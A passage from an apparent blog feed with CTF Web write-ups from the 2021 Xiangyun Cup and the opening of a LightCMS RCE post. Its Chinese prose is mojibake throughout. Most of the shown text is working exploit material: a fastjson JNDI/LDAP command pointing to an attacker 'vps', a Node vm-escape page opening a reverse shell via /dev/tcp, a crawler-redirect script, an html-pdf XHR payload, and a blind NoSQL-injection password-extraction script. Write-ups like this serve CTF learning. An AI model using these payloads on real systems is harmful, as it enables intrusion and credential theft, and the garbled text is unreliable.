       <span class="built_in">print</span> response.content</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>] == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">    runner = runner1</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    runner = runner2</span><br><span class="line"></span><br><span class="line">pool = ThreadPool(<span class="number">32</span>)</span><br><span class="line">result = pool.map_async(runner, <span class="built_in">range</span>(<span class="number">1000000</span>)).get(<span class="number">0xffff</span>)</span><br></pre></td></tr></table></figure><h2 id="å±‚å±‚ç©¿é€"><a href="#å±‚å±‚ç©¿é€" class="headerlink" title="å±‚å±‚ç©¿é€"></a>å±‚å±‚ç©¿é€</h2><p>ç¬¬ä¸€å±‚å‚è€ƒ<a href="https://www.hacking8.com/bug-product/Apache-Flink/Apache-Flink-Dashboard-æœªæˆæƒè®¿é—®-è¿œç¨‹ä»£ç å‘½ä»¤æ‰§è¡Œ.html">https://www.hacking8.com/bug-product/Apache-Flink/Apache-Flink-Dashboard-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.html</a>ï¼Œç›´æ¥ä¸Šä¼ ä¸ªmsfçš„é©¬å°±æœ‰meterpreteräº†ã€‚</p><p><img src="/2021/08/22/2021-xiangyuncup/image-20210822203636530.png" alt="image-20210822203636530"></p><p>10.10.1.11:8080æœ‰ä¸ªwebæœåŠ¡ï¼Œé¢˜ç›®ç»™äº†æºç ï¼Œåº”è¯¥å°±æ˜¯è¿™ä¸ªæœåŠ¡ã€‚</p><p><img src="/2021/08/22/2021-xiangyuncup/image-20210822203749893.png" alt="image-20210822203749893"></p><p>fastjson 1.2.24 ååºåˆ—åŒ–ï¼Œè¿‡æ»¤äº†<code>JdbcRowSetImpl</code>å’Œ<code>TemplatesImpl</code>ï¼Œä»¥åŠ<code>\x</code>,<code>\u</code>ã€‚å°è¯•ä½¿ç”¨åˆ«çš„ç±»ã€‚</p><p>æœ€ç»ˆå‚è€ƒ<a href="https://www.mi1k7ea.com/2021/02/08/Fastjson%E7%B3%BB%E5%88%97%E5%85%AD%E2%80%94%E2%80%941-2-48-1-2-68%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">https://www.mi1k7ea.com/2021/02/08/Fastjson%E7%B3%BB%E5%88%97%E5%85%AD%E2%80%94%E2%80%941-2-48-1-2-68%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</a>ï¼Œä½¿ç”¨<code>org.apache.shiro.realm.jndi.JndiRealmFactory</code>ã€‚</p><p>payloadé•¿åº¦éœ€è¦å¤§äºç­‰äº20000ï¼ŒåŠ ä¸€äº›æ²¡ç”¨çš„å­—ç¬¦å°±è¡Œäº†ã€‚ä½¿ç”¨npsæ­å»ºä»£ç†ï¼Œè¯·æ±‚ï¼š</p><p><img src="/2021/08/22/2021-xiangyuncup/image-20210822204113435.png" alt="image-20210822204113435"></p><p> å¯åŠ¨ldapï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer &quot;http:&#x2F;&#x2F;vps:5555&#x2F;#Exploit&quot; 9999</span><br></pre></td></tr></table></figure><p><img src="/2021/08/22/2021-xiangyuncup/image-20210822204217086.png" alt="image-20210822204217086"></p><p>åå¼¹åˆ°shellï¼š</p><p><img src="/2021/08/22/2021-xiangyuncup/image-20210822204238245.png" alt="image-20210822204238245"></p><h2 id="crawler-z"><a href="#crawler-z" class="headerlink" title="crawler_z"></a>crawler_z</h2><p>tokenå¯ä»¥ç”Ÿæˆä¹‹åå…ˆä¸ä½¿ç”¨ï¼ˆä¸verfiyï¼‰ï¼Œç”Ÿæˆtokenåå…ˆæ›´æ–°urlä¸ºæˆ‘ä»¬çš„urlï¼Œå†verfiyï¼Œè¿™æ ·å¯ä»¥è®©çˆ¬è™«æ¥è¯·æ±‚æˆ‘ä»¬çš„ç½‘é¡µã€‚</p><p>Vpsä¸Šwebç›®å½•åˆ›å»ºä¸€ä¸ªç›®å½•åä¸ºdf101d5f2909f5c05a200e0e2e6b053a.oss-cn-beijing.ichunqiu.comï¼Œå°±å¯ä»¥è®©æœåŠ¡å™¨æ¥è¯·æ±‚åˆ°æˆ‘ä»¬æŒ‡å®šçš„å†…å®¹ã€‚urlä¸º <a href="http://vps/df101d5f2909f5c05a200e0e2e6b053a.oss-cn-beijing.ichunqiu.com/exp.html">http://vps/df101d5f2909f5c05a200e0e2e6b053a.oss-cn-beijing.ichunqiu.com/exp.html</a>ã€‚</p><p>zombieè§£æjsæ—¶ï¼Œæ³¨æ„åˆ° requireäº†vmï¼š</p><p><img src="/2021/08/22/2021-xiangyuncup/image-20210822201913335.png" alt="image-20210822201913335"></p><p>ç”¨vmé€ƒé€¸çš„payloadå¯ä»¥rceã€‚</p><p>vpsçš„htmlä¸ºï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="keyword">const</span> process = <span class="built_in">this</span>.constructor.constructor(<span class="string">&#x27;return this.process&#x27;</span>)();</span></span><br><span class="line"><span class="javascript">process.mainModule.require(<span class="string">&#x27;child_process&#x27;</span>).exec(<span class="string">&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/xxx/1235 0&gt;&amp;1&quot;&#x27;</span>);</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>è¯·æ±‚çš„expï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://eci-2zedkd2t5zhfm6oq17bu.cloudeci1.ichunqiu.com:8888&quot;</span></span><br><span class="line">session = requests.Session()</span><br><span class="line"><span class="comment"># proxies = &#123;&#x27;http&#x27;: &#x27;http://127.0.0.1:8080&#x27;&#125;</span></span><br><span class="line">proxies = &#123;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span>():</span></span><br><span class="line">    paramsPost = &#123;<span class="string">&quot;password&quot;</span>: <span class="string">&quot;gml&quot;</span>, <span class="string">&quot;username&quot;</span>: <span class="string">&quot;gml&quot;</span>&#125;</span><br><span class="line">    headers = &#123;<span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;http://eci-2zefjnsex5f9gb25l314.cloudeci1.ichunqiu.com:8888&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Cache-Control&quot;</span>: <span class="string">&quot;max-age=0&quot;</span>, <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">               <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;http://eci-2zefjnsex5f9gb25l314.cloudeci1.ichunqiu.com:8888/signin&quot;</span>, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>, <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>&#125;</span><br><span class="line">    response = session.post(url + <span class="string">&quot;/signin&quot;</span>, data=paramsPost,</span><br><span class="line">                            headers=headers, proxies=proxies)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_token</span>():</span></span><br><span class="line">    paramsPost = &#123;<span class="string">&quot;bucket&quot;</span>: <span class="string">&quot;https://4653639b575bee89f70fbb0f1b6b721f.oss-cn-beijing.ichunqiu.com/&quot;</span>,</span><br><span class="line">                  <span class="string">&quot;affiliation&quot;</span>: <span class="string">&quot;22&quot;</span>,</span><br><span class="line">                  <span class="string">&quot;age&quot;</span>: <span class="string">&quot;22&quot;</span>&#125;</span><br><span class="line">    headers = &#123;<span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;http://eci-2zefjnsex5f9gb25l314.cloudeci1.ichunqiu.com:8888&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Cache-Control&quot;</span>: <span class="string">&quot;max-age=0&quot;</span>, <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">               <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;http://eci-2zefjnsex5f9gb25l314.cloudeci1.ichunqiu.com:8888/user/profile&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>, <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>&#125;</span><br><span class="line">    response = session.post(url + <span class="string">&quot;/user/profile&quot;</span>, data=paramsPost, headers=headers, allow_redirects=<span class="literal">False</span>,</span><br><span class="line">                            proxies=proxies)</span><br><span class="line">    content = response.content</span><br><span class="line">    index = content.find(<span class="string">&quot;token=&quot;</span>) + <span class="number">6</span></span><br><span class="line">    <span class="keyword">return</span> content[index:index + <span class="number">64</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">req_own_url</span>(<span class="params">own_url, token</span>):</span></span><br><span class="line">    paramsPost = &#123;<span class="string">&quot;bucket&quot;</span>: own_url,</span><br><span class="line">                  <span class="string">&quot;affiliation&quot;</span>: <span class="string">&quot;22&quot;</span>,</span><br><span class="line">                  <span class="string">&quot;age&quot;</span>: <span class="string">&quot;22&quot;</span>&#125;</span><br><span class="line">    headers = &#123;<span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;http://eci-2zefjnsex5f9gb25l314.cloudeci1.ichunqiu.com:8888&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Cache-Control&quot;</span>: <span class="string">&quot;max-age=0&quot;</span>, <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">               <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;http://eci-2zefjnsex5f9gb25l314.cloudeci1.ichunqiu.com:8888/user/profile&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>, <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>&#125;</span><br><span class="line">    response = session.post(url + <span class="string">&quot;/user/profile&quot;</span>, data=paramsPost, headers=headers, allow_redirects=<span class="literal">False</span>,</span><br><span class="line">                            proxies=proxies)</span><br><span class="line">    session.get(url + <span class="string">&quot;/user/verify?token=&quot;</span> + token, proxies=proxies)</span><br><span class="line">    session.get(url + <span class="string">&quot;/user/bucket&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">login()</span><br><span class="line">token = get_token()</span><br><span class="line">req_own_url(<span class="string">&quot;http://vps/df101d5f2909f5c05a200e0e2e6b053a.oss-cn-beijing.ichunqiu.com/exp.html&quot;</span>, token)</span><br></pre></td></tr></table></figure><p><img src="/2021/08/22/2021-xiangyuncup/image-20210822202803001.png" alt="image-20210822202803001"></p><h2 id="Secrets-Of-Admin"><a href="#Secrets-Of-Admin" class="headerlink" title="Secrets_Of_Admin"></a>Secrets_Of_Admin</h2><p>æºç é‡Œæ‰¾åˆ°ç”¨æˆ·åå¯†ç ï¼šadmin/e365655e013ce7fdbdbf8f27b418c8fe6dc9354dc4c0328fa02b0ea547659645 å¯ä»¥ç™»é™†ã€‚<br>ç›®æ ‡åº”è¯¥æ˜¯é€šè¿‡/api/files è¿™ä¸ªæ¥å£æ’å…¥ä¸€æ¡username=admin filename=flag çš„è®°å½•ï¼Œç„¶åå¯ä»¥ä¸‹è½½åˆ°flagæ–‡ä»¶ã€‚</p><p>çŒœæµ‹å¤§æ¦‚ç‡åˆ©ç”¨html-pdfè¿™ä¸ªåº“æ¸²æŸ“çš„æ—¶å€™æ¥å»æ„é€ è¯·æ±‚ï¼Œè¯·æ±‚ /api/files è¿™ä¸ªæ¥å£ã€‚ä½†æ˜¯æœ‰è¿‡æ»¤ï¼Œè¿‡æ»¤äº†å°–æ‹¬å·ï¼Œæ–œæ è¿™äº›ã€‚æµ‹è¯•å‘ç°æ•°ç»„å¯ä»¥ç»•è¿‡è¿‡æ»¤ã€‚</p><p>æ³¨æ„åˆ°flagå­—æ®µæ˜¯ uniqueçš„ï¼Œæ‰€ä»¥ä¸èƒ½æ’å…¥flagï¼š</p><p><img src="/2021/08/22/2021-xiangyuncup/image-20210822203027700.png" alt="image-20210822203027700"></p><p>å› ä¸ºåé¢è¯»æ–‡ä»¶ç”¨çš„æ˜¯<code>path.join(__dirname , &quot;../files/&quot;, filename)</code> ï¼Œæ‰€ä»¥å¯ä»¥æ’å…¥ä¸€ä¸ª ./flag ç»•è¿‡ã€‚</p><p>contentä¸ºï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="keyword">var</span> xhr=<span class="keyword">new</span> XMLHttpRequest();url=<span class="string">&#x27;http://127.0.0.1:8888/api/files?username=admin&amp;filename=./flag&amp;checksum=be5a14a8e504a66979f6938338b0662c&#x27;</span>;xhr.open(<span class="string">&quot;GET&quot;</span>,url,<span class="literal">true</span>);xhr.send();</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2021/08/22/2021-xiangyuncup/image-20210822203143765.png" alt="image-20210822203143765"></p><p>è®¿é—®<a href="http://eci-2zedk1cbvvah2lkdjevj.cloudeci1.ichunqiu.com:8888/api/files/be5a14a8e504a66979f6938338b0662c">http://eci-2zedk1cbvvah2lkdjevj.cloudeci1.ichunqiu.com:8888/api/files/be5a14a8e504a66979f6938338b0662c</a> å¯ä»¥ä¸‹è½½åˆ°flagã€‚</p><h2 id="packagemanager"><a href="#packagemanager" class="headerlink" title="packagemanager"></a>packagemanager</h2><p>authé‚£é‡Œå­˜åœ¨æ³¨å…¥ï¼š</p><p><img src="/2021/08/22/2021-xiangyuncup/image-20210822203339407.png" alt="image-20210822203339407"></p><p>ç›´æ¥æ‹¼æ¥ï¼Œè¿™é‡Œå‡ºé¢˜äººæœ¬æ„åº”è¯¥æ˜¯æ„é€ æ°¸çœŸæ¡ä»¶ç™»é™†ï¼Œä½†æ˜¯è¿™é‡Œå¯ä»¥æ³¨å…¥å‡ºadminçš„å¯†ç ï¼Œåº”è¯¥æ˜¯éé¢„æœŸã€‚</p><p>payloadï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">4054f0d389481b5d2d1695267d22f9f8&quot;||this.username &#x3D;&#x3D; &quot;admin&quot;&amp;&amp;this.password[0]&#x3D;&#x3D;&quot;b&#39;</span><br></pre></td></tr></table></figure><p>Exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">session = requests.Session()</span><br><span class="line"></span><br><span class="line"><span class="comment"># proxies = &#123;&#x27;http&#x27;: &#x27;http://127.0.0.1:8080&#x27;&#125;</span></span><br><span class="line">proxies = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">req</span>(<span class="params">token</span>):</span></span><br><span class="line">    <span class="comment"># token = &#x27;4054f0d389481b5d2d1695267d22f9f8&quot;||this.username == &quot;admin&quot;&amp;&amp;this.password[0]==&quot;b&#x27;</span></span><br><span class="line"></span><br><span class="line">    paramsPost = &#123;<span class="string">&quot;_csrf&quot;</span>: <span class="string">&quot;BGrMGSNa-mNAB8YJ0iXTgG9w-zioJNdJr8i0&quot;</span>,</span><br><span class="line">                  <span class="string">&quot;token&quot;</span>: token&#125;</span><br><span class="line">    headers = &#123;<span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;http://47.104.108.80:8888&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Cache-Control&quot;</span>: <span class="string">&quot;max-age=0&quot;</span>, <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">               <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;http://47.104.108.80:8888/auth&quot;</span>, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>, <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9&quot;</span>, <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>&#125;</span><br><span class="line">    cookies = &#123;<span class="string">&quot;session&quot;</span>: <span class="string">&quot;s%3A_FtDGMZ8FKBr-aGu5R_rY30TJXsnCYYh.fg%2FRDok91jF43jkG%2BqD3weiOFQgsus3kg%2BUSm5iInzU&quot;</span>&#125;</span><br><span class="line">    response = requests.post(<span class="string">&quot;http://47.104.108.80:8888/auth&quot;</span>, data=paramsPost, headers=headers, cookies=cookies,</span><br><span class="line">                             proxies=proxies, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">    <span class="comment"># print response.content</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;Redirecting&quot;</span> <span class="keyword">in</span> response.content:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    ss = <span class="built_in">list</span>(string.printable)</span><br><span class="line">    ss.remove(<span class="string">&#x27;&quot;&#x27;</span>)</span><br><span class="line">    data = <span class="string">&quot;&quot;</span></span><br><span class="line">    tem = <span class="string">&#x27;4054f0d389481b5d2d1695267d22f9f8&quot;||this.username == &quot;admin&quot;&amp;&amp;this.password[%s]==&quot;%s&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">        flag = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> ss:</span><br><span class="line">            payload = tem % (i, c)</span><br><span class="line">            <span class="keyword">if</span> req(payload):</span><br><span class="line">                data += c</span><br><span class="line">                <span class="built_in">print</span> data</span><br><span class="line">                flag = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> flag:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&quot;fail!&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span>():</span></span><br><span class="line">    <span class="built_in">print</span> req(<span class="string">&#x27;4054f0d389481b5d2d1695267d22f9f8&quot;||this.username == &quot;admin&quot;&amp;&amp;this.password[0]==&quot;b&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># test()</span></span><br><span class="line">exp()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ³¨å…¥å‡ºå¯†ç æ˜¯<code>b!@#$d5dh47jyfz#098crw*w</code>ï¼Œadminç™»é™†è¿›å»å°±æœ‰flagã€‚</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;2021 ç¥¥äº‘æ¯åˆèµ› Web é¢˜è§£ã€‚&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="https://igml.top/categories/CTF/"/>
    
    <category term="Web" scheme="https://igml.top/categories/CTF/Web/"/>
    
    <category term="wp" scheme="https://igml.top/categories/CTF/Web/wp/"/>
    
    
    <category term="CTF" scheme="https://igml.top/tags/CTF/"/>
    
    <category term="Web" scheme="https://igml.top/tags/Web/"/>
    
    <category term="wp" scheme="https://igml.top/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>lightcmsåå°RCEæ¼æ´æŒ–æ˜</title>
    <link href="https://igml.top/2021/05/10/lightcms-RCE/"/>
    <id>https://igml.top/2021/05/10/lightcms-RCE/</id>
    <published>2021-05-09T16:05:33.000Z</published>
    <updated>2021-05-11T13:46:58.115Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>ä¹‹å‰ä¸ºäº†ç†Ÿæ‚‰ä¸‹ laravelï¼Œæ‰¾äº†ä¸ªåŸºäº laravel å¼€å‘çš„ cms å®¡è®¡ç»ƒç»ƒæ‰‹ï¼Œç„å‡†äº† lightcmsã€‚</p><p>å…ˆæ˜¯æŒ–åˆ°äº†ä¸€ä¸ªæ¯”è¾ƒç®€å•çš„ä»»æ„æ–‡ä»¶è¯»å–&amp;RCEæ¼æ´ï¼Œæäº†issueè¢«ä¿®å¤ååˆç®€å•å®¡è®¡äº†ä¸€æ³¢ï¼ŒæŒ–æ˜åˆ°äº†ä¸€ä¸ªæœ‰æ„æ€çš„RCEï¼Œæ„Ÿè§‰å¾ˆé€‚åˆ CTFï¼Œå°±æ‹¿æ¥å‡ºé¢˜äº†ï¼Œè¢«ç”¨åšäº†ä»Šå¹´çº¢å¸½æ¯çš„åˆèµ›ã€‚å¾ˆé—æ†¾ç”±äºæ”¾å‡ºé¢˜ç›®æ—¶é—´è¾ƒæ™š+å¾ˆå¤šdalaoå»æ‰“æ´¥é—¨æ¯äº†ï¼Œè¿™é“é¢˜åªæœ‰ä¸¤ä¸ªé˜Ÿä¼è§£å‡ºã€‚</p><p>é¢˜ç›®ç¯å¢ƒé“¾æ¥ï¼š<a href="https://github.com/gml-sec/My-CTF-Challenges/tree/main/2021-Redhat-ezlight">https://github.com/gml-sec/My-CTF-Challenges/tree/main/2021-Redhat-ezlight</a>ã€‚</p><a id="more"></a><p>å…³äºlightcmsçš„ç®€å•ä»‹ç»ï¼š</p><blockquote><p><code>lightCMS</code>æ˜¯ä¸€ä¸ªè½»é‡çº§çš„<code>CMS</code>ç³»ç»Ÿï¼Œä¹Ÿå¯ä»¥ä½œä¸ºä¸€ä¸ªé€šç”¨çš„åå°ç®¡ç†æ¡†æ¶ä½¿ç”¨ã€‚<code>lightCMS</code>é›†æˆäº†ç”¨æˆ·ç®¡ç†ã€æƒé™ç®¡ç†ã€æ—¥å¿—ç®¡ç†ã€èœå•ç®¡ç†ç­‰åå°ç®¡ç†æ¡†æ¶çš„é€šç”¨åŠŸèƒ½ï¼ŒåŒæ—¶ä¹Ÿæä¾›æ¨¡å‹ç®¡ç†ã€åˆ†ç±»ç®¡ç†ç­‰<code>CMS</code>ç³»ç»Ÿä¸­å¸¸ç”¨çš„åŠŸèƒ½ã€‚</p></blockquote><p>githubåœ°å€ï¼š<a href="https://github.com/eddy8/LightCMS">https://github.com/eddy8/LightCMS</a></p><h2 id="v1-3-5-ä»»æ„æ–‡ä»¶è¯»å–-amp-RCEæ¼æ´"><a href="#v1-3-5-ä»»æ„æ–‡ä»¶è¯»å–-amp-RCEæ¼æ´" class="headerlink" title="v1.3.5 ä»»æ„æ–‡ä»¶è¯»å–&amp;RCEæ¼æ´"></a>v1.3.5 ä»»æ„æ–‡ä»¶è¯»å–&amp;RCEæ¼æ´</h2><p>è¿™ä¸ªæ¼æ´å‡ºåœ¨ <code>app/Http/Controllers/Admin/NEditorController.php</code>ä¸­çš„è¿œç¨‹ä¸‹è½½å›¾ç‰‡çš„åŠŸèƒ½ï¼š</p><p><img src="/2021/05/10/lightcms-RCE/image-20210510001913866.png" alt="image-20210510001913866"></p><p>è¿™é‡Œç®€å•ä½¿ç”¨äº† 